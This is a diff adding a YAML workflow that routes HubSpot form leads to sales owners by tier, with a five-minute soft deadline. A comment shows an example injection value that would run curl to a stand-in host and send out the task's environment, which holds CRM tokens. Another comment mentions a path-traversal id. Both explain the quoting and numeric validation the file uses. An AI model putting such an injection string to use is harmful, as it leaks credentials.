@@ -1,0 +1,123 @@
+# 03 — Speed-to-lead routing, called as a durable function.
+#
+#   qualify ─▶ (enterprise) claim-AE  ─┐
+#              (mid-market) round-robin├─▶ decision ─▶ (task in HubSpot)
+#              (self-serve) nurture    ─┘
+#
+# A HubSpot form-submission webhook POSTs this workflow with `?wait=true` and
+# gets the owner back in the response body — `result_from: decision` makes the
+# run a function call that happens to be durable, retried and audited:
+#
+#   curl -s -X POST 'https://dagron.internal/runs?wait=true&timeout_secs=30' \
+#        --data-binary @03_speed_to_lead_router.yaml
+#   {"status":"succeeded","result":"owner=ae-1@acme.com tier=enterprise"}
+#
+# The five-minute `deadline:` is the actual business rule — speed-to-lead decays
+# hard after five minutes. It is a *soft* SLA: the run keeps going and emits
+# `run.deadline_exceeded` plus the webhook notification, because a late routing
+# decision still beats none. `run_timeout_secs` is the hard stop.
+name: mktg_speed_to_lead_router
+tags: [marketing, lead-gen, routing, sla]
+environment: prod
+result_from: decision
+deadline: { in: 5m }
+run_timeout_secs: 900
+parameters:
+  contact_id: ""
+  email: ""
+  form_guid: ""
+  utm_campaign: ""
+
+task_defaults:
+  max_attempts: 3
+  retry_delay_secs: 2
+  retry_max_delay_secs: 20
+  timeout_secs: 30
+  priority: 100                 # ahead of every batch job in the ready queue
+  env:
+    - { name: HUBSPOT_TOKEN, value_from: { secret: HUBSPOT_PRIVATE_APP_TOKEN } }
+    - { name: SFDC_SECRET, value_from: { secret: SALESFORCE_CLIENT_SECRET } }
+    # Everything below arrives from the form submission that triggered this run,
+    # by way of a HubSpot webhook — `utm_campaign` in particular is whatever was
+    # in the query string of a public URL. Run parameters are substituted into
+    # the command string verbatim, so a value pasted into an `sh -c` argument is
+    # shell source: `q3-launch; curl evil.example -d @/proc/self/environ #` would
+    # run as a second command, with this task's CRM credentials in its
+    # environment. Bound to the environment and dereferenced as quoted variables,
+    # the same value is only ever an argument.
+    - { name: CONTACT_ID, value: "{{ contact_id }}" }
+    - { name: LEAD_EMAIL, value: "{{ email }}" }
+    - { name: FORM_GUID, value: "{{ form_guid }}" }
+    - { name: UTM_CAMPAIGN, value: "{{ utm_campaign }}" }
+
+notify:
+  webhook:
+    url: "https://hooks.example.com/mktg/routing/{{ contact_id }}"
+    on: [succeeded, failed, deadline_exceeded]
+
+tasks:
+  # Prints exactly one of: enterprise | mid-market | self-serve
+  - name: qualify
+    command:
+      - sh
+      - -c
+      - |
+        set -eu
+        # Quoting the variable stops the *shell* reading it as source; it does
+        # nothing about the URL, where `/`, `?` and `#` are structural. A webhook
+        # sending `1/../../deals/99` would otherwise fetch a different object
+        # entirely. HubSpot contact ids are numeric, so anything else is a
+        # malformed webhook rather than a lead, and this run should stop.
+        case "$CONTACT_ID" in
+          '' | *[!0-9]*)
+            echo "contact_id '$CONTACT_ID' is not a numeric HubSpot id" >&2
+            exit 1
+            ;;
+        esac
+        curl -sf -H "Authorization: Bearer $HUBSPOT_TOKEN" \
+          "https://api.hubapi.com/crm/v3/objects/contacts/$CONTACT_ID?properties=icp_tier,company,jobtitle,country" \
+          > "$DAGRON_ARTIFACTS/contact.json"
+        # Printed for the `when:` gates below, and teed to a file because
+        # `{{ tasks.*.output }}` substitutes in conditions only — a command that
+        # needs an upstream value reads it from the shared artifact directory.
+        tier-of "$DAGRON_ARTIFACTS/contact.json" | tee "$DAGRON_ARTIFACTS/tier.txt"
+
+  # Three mutually exclusive branches decided by an upstream task's *output*,
+  # evaluated when the task becomes ready — not at submit. No routing script
+  # outside the DAG gets a vote on where the lead goes.
+  - name: claim_ae
+    depends_on: [qualify]
+    when: "{{ tasks.qualify.output }} == enterprise"
+    command: ["sh", "-c", "assign-named-account --contact \"$CONTACT_ID\" --book enterprise > \"$DAGRON_ARTIFACTS/owner.txt\""]
+
+  - name: round_robin
+    depends_on: [qualify]
+    when: "{{ tasks.qualify.output }} == mid-market"
+    command: ["sh", "-c", "assign-round-robin --contact \"$CONTACT_ID\" --queue mid-market > \"$DAGRON_ARTIFACTS/owner.txt\""]
+
+  - name: nurture
+    depends_on: [qualify]
+    when: "{{ tasks.qualify.output }} == self-serve"
+    command: ["sh", "-c", "hubspot-list-add --list plg_nurture --contact \"$CONTACT_ID\" && echo nurture@acme.com > \"$DAGRON_ARTIFACTS/owner.txt\""]
+
+  # none_failed: exactly one branch ran and two were skipped. all_success would
+  # never fire here — a skipped dependency is not a success.
+  - name: decision
+    depends_on: [claim_ae, round_robin, nurture]
+    trigger_rule: none_failed
+    produces: [hubspot://crm/lead-routing]
+    command:
+      - sh
+      - -c
+      - |
+        set -eu
+        owner=$(cat "$DAGRON_ARTIFACTS/owner.txt")
+        tier=$(cat "$DAGRON_ARTIFACTS/tier.txt")
+        hubspot-create-task --contact "$CONTACT_ID" --owner "$owner" \
+          --subject "Follow up: $FORM_GUID / $UTM_CAMPAIGN" --due "+15 minutes"
+        echo "owner=$owner tier=$tier"
+
+  - name: alert_unrouted
+    hook: on_failure
+    max_attempts: 1
+    command: ["sh", "-c", "post-slack demand-gen-alerts \"routing failed for $LEAD_EMAIL - manual follow-up needed\""]
